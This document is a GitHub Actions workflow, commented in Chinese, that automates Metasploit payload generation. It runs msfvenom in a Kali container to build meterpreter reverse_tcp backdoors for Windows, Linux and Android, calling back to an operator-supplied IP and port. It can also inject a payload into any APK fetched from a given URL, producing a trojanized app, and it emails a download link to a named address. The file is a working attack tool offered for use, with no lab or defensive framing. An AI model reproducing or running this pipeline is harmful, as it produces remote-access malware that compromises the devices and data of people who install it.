name: Generate Metasploit Payload

on:
  workflow_dispatch:
    inputs:
      platform:
        description: '选择目标平台'
        required: true
        default: 'windows'
        type: choice
        options:
          - windows
          - linux
          - android
          - android-base
      lhost:
        description: '输入你的公网IP或内网IP'
        required: true
        default: '192.168.1.100'
      lport:
        description: '输入监听端口'
        required: true
        default: '4444'
      url:
        description: '输入apk文件下载链接'
      
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Download apk
        if: ${{ github.event.inputs.platform == 'android-base' }}
        run: |
          curl -L "${{ github.event.inputs.url }}" --output base.apk
      
      - name: Generate Payload using Kali Docker
        run: |
          docker pull kalilinux/kali-rolling
          
          # 根据用户选择的平台，设置 msfvenom 参数
          case "${{ github.event.inputs.platform }}" in
            "windows")
              PAYLOAD="windows/x64/meterpreter/reverse_tcp"
              EXT="exe"
              FORMAT_FLAG="-f exe"
              PLATFORM="" # 留空，windows不需要额外平台参数
              ;;
            "android")
              PAYLOAD="android/meterpreter/reverse_tcp"
              EXT="apk"
              FORMAT_FLAG="AndroidWakelock=true StageEncoder=aes/base64 AndroidUncrypt=true" # apk格式不需要-f参数
              PLATFORM="--platform android"
              ;;
            "android-base")
              PAYLOAD="android/meterpreter/reverse_tcp"
              EXT="apk"
              FORMAT_FLAG="AndroidWakelock=true StageEncoder=aes/base64 AndroidUncrypt=true" # apk格式不需要-f参数
              PLATFORM="--platform android -x /output/base.apk"
              ;;
            "linux")
              PAYLOAD="linux/x64/meterpreter/reverse_tcp"
              EXT="elf"
              FORMAT_FLAG="-f elf"
              PLATFORM=""
              ;;
            *)
              echo "不支持的平台"
              exit 1
              ;;
          esac

          # 生成文件名并保存到环境变量（在容器外部执行）
          ENAME=$(cat /proc/sys/kernel/random/uuid)
          echo "FILENAME=$ENAME" >> $GITHUB_ENV
          echo "EXT=$EXT" >> $GITHUB_ENV
          OUTPUT_FILE="/output/${ENAME}.${EXT}"

          echo "正在生成载荷: $PAYLOAD"
          echo "输出文件: $OUTPUT_FILE"

          # 运行容器并生成 Payload
          docker run --rm \
            -v "${PWD}:/output" \
            -u root \
            kalilinux/kali-rolling \
            bash -c "apt-get update && \
                     apt-get install -y metasploit-framework apktool && \
                     msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
          
          
      
      - name: Upload Payload
        uses: actions/upload-artifact@v4
        id: upl
        with:
          name: Generated-Payload
          # 拼接路径和文件名
          path: ${{ env.FILENAME }}.${{ env.EXT }}
      - name: Send email
        uses: dawidd6/action-send-mail@v11
        with:
          server_address: smtp.163.com
          server_port: 465
          secure: true
          username: ${{ secrets.EMAIL_USERNAME }}
          password: ${{ secrets.EMAIL_PASSWORD }}
          subject: Download link
          to: xumouren225588@163.com
          from: github-actions[bot]
          # 可选，文本内容
          body: "https://nightly.link/${{ github.repository_owner }}/${{ github.event.repository.name }}/actions/artifacts/${{ steps.upl.outputs.artifact-id }}.zip"
